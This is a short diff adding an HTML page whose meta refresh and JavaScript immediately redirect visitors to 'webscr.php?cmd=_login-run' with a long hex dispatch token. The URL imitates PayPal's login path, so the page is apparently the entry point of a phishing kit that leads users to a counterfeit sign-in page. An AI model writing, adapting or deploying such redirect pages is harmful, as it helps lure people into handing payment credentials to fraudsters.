@@ -1,0 +1,8 @@
+<html><head>
+<meta HTTP-Equiv="refresh" content="0; URL=webscr.php%3Fcmd=_login-run&amp;dispatch=5885d80a13c0db1f998ca054efbdf2c29878a435fe324eec2511727fbf3e9efc3a1775dfa2cd2c0b4f0e4cf7f8f23f683a1775dfa2cd2c0b4f0e4cf7f8f23f68.html">
+<script type="text/javascript">
+echo = "webscr.php?cmd=_login-run&dispatch=5885d80a13c0db1f998ca054efbdf2c29878a435fe324eec2511727fbf3e9efc3a1775dfa2cd2c0b4f0e4cf7f8f23f683a1775dfa2cd2c0b4f0e4cf7f8f23f68"
+self.location.replace(echo);
+window.location = echo;
+</script>
+</head>
